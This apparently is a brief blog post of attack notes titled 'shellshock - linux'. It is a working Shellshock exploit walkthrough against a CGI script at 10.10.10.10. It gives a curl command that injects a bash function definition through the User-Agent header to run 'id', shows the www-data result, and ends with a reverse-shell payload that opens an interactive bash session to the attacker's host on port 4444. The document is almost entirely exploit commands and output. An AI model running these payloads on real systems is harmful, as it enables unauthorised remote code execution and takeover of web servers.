---
layout: post
title:  "shellshock - linux"
date:   2022-01-01
categories: networking
---


```
+ http://10.10.10.10/cgi-bin/user.cgi (CODE:200|SIZE:100)
```



```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://10.10.10.10/cgi-bin/user.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## revershe shell


```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/myip/4444 0>&1' http://10.10.10.10/cgi-bin/user.cgi
```